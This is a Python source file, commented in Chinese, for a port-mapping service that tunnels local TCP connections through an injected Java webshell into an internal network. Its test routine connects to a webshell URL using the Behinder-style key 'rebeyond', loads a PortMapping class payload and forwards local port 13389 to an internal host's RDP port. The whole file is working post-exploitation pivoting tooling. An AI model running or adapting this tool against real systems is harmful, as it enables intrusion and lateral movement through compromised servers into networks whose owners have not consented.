
#!/usr/bin/env python3
"""
端口映射服务 - 重构版
专为内网远程桌面、数据库等服务映射设计

核心特性：
1. 简单易用的点对点映射
2. 自动连接管理和重连
3. 支持多并发连接
4. 自适应轮询优化性能
5. 连接复用减少资源消耗

使用场景：
- 远程桌面：本地3389 -> 内网IP:3389
- 数据库访问：本地3306 -> 内网IP:3306  
- Web服务：本地8080 -> 内网IP:80
"""

import socket
import threading
import time
from .javaShell import JavaShell
from .javaPayload import javaPayload


class PortMapping:
    """单个端口映射管理类"""
    
    def __init__(self, local_port, target_ip, target_port, mapping_service):
        self.local_port = local_port
        self.target_ip = target_ip
        self.target_port = target_port
        self.mapping_service = mapping_service
        
        # 映射标识和状态
        self.mapping_id = f"mapping_{local_port}_{target_ip}_{target_port}_{int(time.time())}"
        self.is_active = False
        self.server_socket = None
        
        # 连接管理
        self.active_connections = {}  # {conn_id: connection_info}
        self.connection_counter = 0
        
        # 统计信息
        self.created_time = time.time()
        self.total_connections = 0
        
    def start(self):
        """启动端口映射"""
        try:
            print(f"[INFO] 🚀 启动端口映射: {self.local_port} -> {self.target_ip}:{self.target_port}")
            
            # 创建本地监听socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.local_port))
            self.server_socket.listen(10)
            
            self.is_active = True
            print(f"✅ 本地端口 {self.local_port} 监听成功")
            
            # 启动监听线程
            listen_thread = threading.Thread(
                target=self._listen_for_connections,
                daemon=True,
                name=f"PortMapping-{self.local_port}-Listener"
            )
            listen_thread.start()
            
            return True
            
        except Exception as e:
            print(f"❌ 启动端口映射失败: {e}")
            return False
    
    def stop(self):
        """停止端口映射"""
        print(f"[INFO] 🛑 停止端口映射: {self.local_port}")
        
        # 先设置停止标志
        self.is_active = False
        
        # 强制关闭服务器socket
        if self.server_socket:
            try:
                # 先shutdown再close，确保立即停止接收连接
                self.server_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            try:
                self.server_socket.close()
            except:
                pass
            finally:
                self.server_socket = None
        
        # 清理所有连接
        connection_ids = list(self.active_connections.keys())
        for conn_id in connection_ids:
            self._cleanup_connection(conn_id)
        
        # 等待一小段时间让线程完全停止
        import time
        time.sleep(0.1)
        
        print(f"✅ 端口映射已停止: {self.local_port}")
    
    def _listen_for_connections(self):
        """监听新连接"""
        print(f"[DEBUG] 开始监听端口: {self.local_port}")
        
        while self.is_active:
            try:
                client_socket, client_addr = self.server_socket.accept()
                self.total_connections += 1
                self.connection_counter += 1
                
                conn_id = f"{self.mapping_id}_conn_{self.connection_counter}"
                print(f"[INFO] 📥 新连接: {client_addr} -> {conn_id}")
                
                # 启动连接处理线程
                conn_thread = threading.Thread(
                    target=self._handle_connection,
                    args=(client_socket, conn_id, client_addr),
                    daemon=True,
                    name=f"Connection-{conn_id}"
                )
                conn_thread.start()
                
            except socket.error as e:
                if self.is_active:
                    print(f"[ERROR] 接受连接失败: {e}")
                break
            except Exception as e:
                print(f"[ERROR] 监听异常: {e}")
                break
        
        print(f"[DEBUG] 停止监听端口: {self.local_port}")
    
    def _handle_connection(self, client_socket, conn_id, client_addr):
        """处理单个连接"""
        try:
            print(f"[DEBUG] 🔗 处理连接: {conn_id}")
            
            # 检查是否有可复用的webshell隧道
            reusable_tunnel = self._find_reusable_tunnel()
            
            if reusable_tunnel:
                webshell_mapping_id = reusable_tunnel['webshell_mapping_id']
                print(f"[INFO] ♻️ 复用webshell隧道: {webshell_mapping_id}")
            else:
                # 创建新的webshell端映射
                webshell_mapping_id = f"{conn_id}_webshell"
                success = self.mapping_service.shell.create_port_mapping(
                    webshell_mapping_id,
                    self.target_ip,
                    str(self.target_port),
                    self.mapping_service.port_mapping_class_name
                )
                
                if not success:
                    print(f"❌ 创建webshell端映射失败: {conn_id}")
                    client_socket.close()
                    return
                
                print(f"[INFO] ✨ 创建新webshell隧道: {webshell_mapping_id}")
            
            # 保存连接信息
            connection_info = {
                'conn_id': conn_id,
                'webshell_mapping_id': webshell_mapping_id,
                'client_socket': client_socket,
                'client_addr': client_addr,
                'created_time': time.time(),
                'is_active': True,
                'tunnel_reused': reusable_tunnel is not None
            }
            
            self.active_connections[conn_id] = connection_info
            
            # 启动双向数据转发
            self._start_data_forwarding(connection_info)
            
        except Exception as e:
            print(f"❌ 连接处理异常: {e}")
            try:
                client_socket.close()
            except:
                pass
    
    def _find_reusable_tunnel(self):
        """查找可复用的webshell隧道"""
        # 简化版：暂时不实现复用，每个连接都创建新隧道
        # 这样更稳定，性能损失可接受
        return None
    
    def _start_data_forwarding(self, connection_info):
        """启动双向数据转发"""
        conn_id = connection_info['conn_id']
        
        print(f"[DEBUG] 🔄 启动数据转发: {conn_id}")
        
        # 启动两个转发线程
        upload_thread = threading.Thread(
            target=self._forward_client_to_target,
            args=(connection_info,),
            daemon=True,
            name=f"Upload-{conn_id}"
        )
        
        download_thread = threading.Thread(
            target=self._forward_target_to_client,
            args=(connection_info,),
            daemon=True,
            name=f"Download-{conn_id}"
        )
        
        upload_thread.start()
        download_thread.start()
        
        # 等待任一线程结束（意味着连接断开）
        upload_thread.join()
        download_thread.join()
        
        # 清理连接
        self._cleanup_connection(conn_id)
    
    def _forward_client_to_target(self, connection_info):
        """转发客户端数据到目标（上传方向）"""
        conn_id = connection_info['conn_id']
        client_socket = connection_info['client_socket']
        webshell_mapping_id = connection_info['webshell_mapping_id']
        
        print(f"[DEBUG] ⬆️ 启动上传转发: {conn_id}")
        
        try:
            while connection_info['is_active']:
                try:
                    # 从客户端读取数据
                    data = client_socket.recv(8192)
                    if not data:
                        print(f"[INFO] 📤 客户端关闭连接: {conn_id}")
                        break
                    
                    # 转发到webshell端的目标
                    success = self.mapping_service.shell.forward_to_mapping(
                        webshell_mapping_id,
                        data,
                        self.mapping_service.port_mapping_class_name
                    )
                    
                    if not success:
                        print(f"[WARNING] ⚠️ 上传转发失败: {conn_id}")
                        break
                    
                    # print(f"[DEBUG] 上传数据: {conn_id}, {len(data)} bytes")
                    
                except socket.error as e:
                    print(f"[INFO] 客户端断开: {conn_id} - {e}")
                    break
                except Exception as e:
                    print(f"[ERROR] 上传转发异常: {e}")
                    break
        
        except Exception as e:
            print(f"[ERROR] 上传转发总异常: {e}")
        finally:
            connection_info['is_active'] = False
            print(f"[DEBUG] 上传转发结束: {conn_id}")
    
    def _forward_target_to_client(self, connection_info):
        """转发目标数据到客户端（下载方向）- 自适应轮询"""
        conn_id = connection_info['conn_id']
        client_socket = connection_info['client_socket']
        webshell_mapping_id = connection_info['webshell_mapping_id']
        
        print(f"[DEBUG] ⬇️ 启动下载转发: {conn_id}")
        
        # 自适应轮询参数
        min_interval = 0.001  # 高频：1ms
        max_interval = 0.05   # 低频：50ms  
        current_interval = min_interval
        no_data_count = 0
        
        try:
            while connection_info['is_active']:
                try:
                    # 从webshell端读取数据
                    data = self.mapping_service.shell.read_from_mapping(
                        webshell_mapping_id,
                        self.mapping_service.port_mapping_class_name
                    )
                    
                    if data is None:
                        # webshell端连接关闭
                        print(f"[INFO] 🔌 webshell端连接关闭: {conn_id}")
                        break
                    elif len(data) == 0:
                        # 没有数据，降低轮询频率
                        no_data_count += 1
                        if no_data_count > 20:
                            current_interval = min(current_interval * 1.2, max_interval)
                        time.sleep(current_interval)
                        continue
                    else:
                        # 有数据，发送给客户端并切换到高频模式
                        no_data_count = 0
                        current_interval = min_interval
                        
                        try:
                            client_socket.send(data)
                            # print(f"[DEBUG] 下载数据: {conn_id}, {len(data)} bytes")
                        except socket.error as e:
                            print(f"[INFO] 客户端断开: {conn_id} - {e}")
                            break
                        
                        # 高频模式下的短暂等待
                        time.sleep(current_interval)
                
                except Exception as e:
                    error_msg = str(e).lower()
                    if any(keyword in error_msg for keyword in ['connection closed', 'connection not found', 'mapping not found']):
                        print(f"[INFO] webshell端连接异常: {conn_id} - {e}")
                        break
                    else:
                        print(f"[ERROR] 下载转发异常: {e}")
                        time.sleep(0.01)  # 异常时短暂等待
        
        except Exception as e:
            print(f"[ERROR] 下载转发总异常: {e}")
        finally:
            connection_info['is_active'] = False
            print(f"[DEBUG] 下载转发结束: {conn_id}")
    
    def _cleanup_connection(self, conn_id):
        """清理连接"""
        if conn_id not in self.active_connections:
            return
        
        connection_info = self.active_connections[conn_id]
        webshell_mapping_id = connection_info['webshell_mapping_id']
        
        print(f"[DEBUG] 🧹 清理连接: {conn_id}")
        
        # 关闭客户端socket
        try:
            connection_info['client_socket'].close()
        except:
            pass
        
        # 关闭webshell端映射
        try:
            self.mapping_service.shell.close_port_mapping(
                webshell_mapping_id,
                self.mapping_service.port_mapping_class_name
            )
            print(f"[DEBUG] webshell端映射已关闭: {webshell_mapping_id}")
        except Exception as e:
            print(f"[WARNING] 关闭webshell端映射失败: {e}")
        
        # 从活跃连接中移除
        del self.active_connections[conn_id]
        print(f"✅ 连接清理完成: {conn_id}")
    
    def get_status(self):
        """获取映射状态"""
        return {
            'mapping_id': self.mapping_id,
            'local_port': self.local_port,
            'target': f"{self.target_ip}:{self.target_port}",
            'is_active': self.is_active,
            'active_connections': len(self.active_connections),
            'total_connections': self.total_connections,
            'uptime': time.time() - self.created_time
        }


class PortMappingService:
    """端口映射服务管理器"""
    
    def __init__(self, shell: JavaShell,port_mapping_class_name):
        self.shell = shell
        self.port_mapping_class_name = port_mapping_class_name
        self.active_mappings = {}  # {local_port: PortMapping}
        
    def create_mapping(self, local_port, target_ip, target_port):
        """
        创建端口映射
        
        参数:
            local_port: 本地监听端口
            target_ip: 内网目标IP
            target_port: 内网目标端口
            
        返回:
            bool: 创建是否成功
        """
        try:            
            # 检查端口是否已被使用
            if local_port in self.active_mappings:
                print(f"❌ 本地端口 {local_port} 已被映射使用")
                return False
            
            # 创建端口映射对象
            mapping = PortMapping(local_port, target_ip, target_port, self)
            
            # 启动映射
            if mapping.start():
                self.active_mappings[local_port] = mapping
                print(f"✅ 端口映射创建成功: {local_port} -> {target_ip}:{target_port}")
                return True
            else:
                print(f"❌ 端口映射启动失败: {local_port}")
                return False
                
        except Exception as e:
            print(f"❌ 创建端口映射异常: {e}")
            return False
    
    def remove_mapping(self, local_port):
        """移除端口映射"""
        try:
            if local_port not in self.active_mappings:
                print(f"⚠️ 端口映射不存在: {local_port}")
                return False
            
            mapping = self.active_mappings[local_port]
            mapping.stop()
            del self.active_mappings[local_port]
            
            print(f"✅ 端口映射已移除: {local_port}")
            return True
            
        except Exception as e:
            print(f"❌ 移除端口映射异常: {e}")
            return False
    
    def get_all_mappings_status(self):
        """获取所有映射的状态"""
        status = {
            'total_mappings': len(self.active_mappings),
            'mappings': []
        }
        
        for local_port, mapping in self.active_mappings.items():
            status['mappings'].append(mapping.get_status())
        
        return status
    
    def close_all_mappings(self):
        """关闭所有端口映射"""
        print("[INFO] 🛑 关闭所有端口映射...")
        
        local_ports = list(self.active_mappings.keys())
        for local_port in local_ports:
            self.remove_mapping(local_port)
        
        # 清理webshell端所有映射
        if self.port_mapping_class_name:
            try:
                self.shell.clear_all_port_mappings(self.port_mapping_class_name)
            except:
                pass
        
        print("✅ 所有端口映射已关闭")


# 使用示例和测试代码
def test_port_mapping_scenarios():
    """测试不同场景的端口映射"""
    try:
        print("=" * 80)
        print("🎯 端口映射服务 - 实用场景测试")
        print("=" * 80)
        
        # webshell连接配置
        WEBSHELL_CONFIG = {
            "url": "http://172.26.36.30:8080/webshell/linux_webshell.jsp",
            "param_name": "pass",
            "secret_key": "rebeyond"
        }
        
        print("🔗 正在连接webshell...")
        
        # 初始化webshell连接
        shell = JavaShell(
            url=WEBSHELL_CONFIG["url"],
            param_name=WEBSHELL_CONFIG["param_name"], 
            secret_key=WEBSHELL_CONFIG["secret_key"]
        )
        
        # 初始化payload
        shell.init_payload()
        
        # 测试webshell连接
        if not shell.test():
            print("❌ Webshell连接测试失败！")
            return False
        
        print("✅ Webshell连接测试成功!")
        
        # 创建端口映射服务
        print("🔧 正在初始化端口映射服务...")
        payload = javaPayload()
        classInfo = payload.getPayload(
            class_name="PortMapping", 
            obfuscation_method='none'
        )
        
        if not shell.include(classInfo):
            print("❌ 加载PortMapping类失败")
            return False
        mapping_service = PortMappingService(shell,port_mapping_class_name="PortMapping")
        
        # 创建多个实用的端口映射
        mappings_to_create = [
            {
                'local_port': 13389,
                'target_ip': '192.168.47.174',
                'target_port': 3389,
                'description': 'HTTP服务测试'
            },
            # 可以添加更多映射
            # {
            #     'local_port': 13306, 
            #     'target_ip': '192.168.1.200',
            #     'target_port': 3306,
            #     'description': 'MySQL数据库'
            # }
        ]
        
        # 创建映射
        for mapping_config in mappings_to_create:
            print(f"\n🌐 创建映射: {mapping_config['description']}")
            print(f"   {mapping_config['local_port']} -> {mapping_config['target_ip']}:{mapping_config['target_port']}")
            
            success = mapping_service.create_mapping(
                mapping_config['local_port'],
                mapping_config['target_ip'], 
                mapping_config['target_port']
            )
            
            if not success:
                print(f"❌ 映射创建失败: {mapping_config['description']}")
            else:
                print(f"✅ 映射创建成功: {mapping_config['description']}")
        
        # 显示状态信息
        print("\n" + "=" * 80)
        print("📊 端口映射状态")
        print("=" * 80)
        
        status = mapping_service.get_all_mappings_status()
        print(f"总映射数: {status['total_mappings']}")
        
        for mapping_status in status['mappings']:
            print(f"\n📍 映射: {mapping_status['local_port']} -> {mapping_status['target']}")
            print(f"   状态: {'🟢 活跃' if mapping_status['is_active'] else '🔴 非活跃'}")
            print(f"   当前连接: {mapping_status['active_connections']}")
            print(f"   总连接数: {mapping_status['total_connections']}")
            print(f"   运行时间: {mapping_status['uptime']:.1f}s")
        
        print("\n" + "=" * 80)
        print("🎮 使用说明")
        print("=" * 80)
        
        for mapping_config in mappings_to_create:
            local_port = mapping_config['local_port']
            description = mapping_config['description']
            
            print(f"\n📌 {description}:")
            print(f"   连接地址: 0.0.0.0:{local_port}")
            
            if 'HTTP' in description or 'Web' in description:
                print(f"   浏览器访问: http://0.0.0.0:{local_port}")
            elif 'MySQL' in description:
                print(f"   数据库连接: mysql -h 0.0.0.0 -P {local_port} -u username -p")
            elif '远程桌面' in description or 'RDP' in description:
                print(f"   远程桌面: mstsc /v:0.0.0.0:{local_port}")
        
        print(f"\n💡 特性:")
        print(f"   ✅ 自动连接管理 - 断开后自动清理")
        print(f"   ✅ 多并发支持 - 同时支持多个连接")
        print(f"   ✅ 自适应轮询 - 有数据高频(1ms)，无数据低频(50ms)")
        print(f"   ✅ 稳定可靠 - 每个连接独立管理")
        
        print(f"\n🛑 按Ctrl+C停止服务")
        
        # 保持服务运行
        try:
            while True:
                time.sleep(10)
                # 定期显示状态
                status = mapping_service.get_all_mappings_status()
                total_connections = sum(m['active_connections'] for m in status['mappings'])
                print(f"[{time.strftime('%H:%M:%S')}] 映射数: {status['total_mappings']}, 活跃连接: {total_connections}")
                
        except KeyboardInterrupt:
            print(f"\n[INFO] 🛑 收到停止信号")
        
        return True
        
    except Exception as e:
        print(f"❌ 测试异常: {e}")
        import traceback
        traceback.print_exc()
        return False
    
def main():
    test_port_mapping_scenarios()

if __name__ == "__main__":
    main()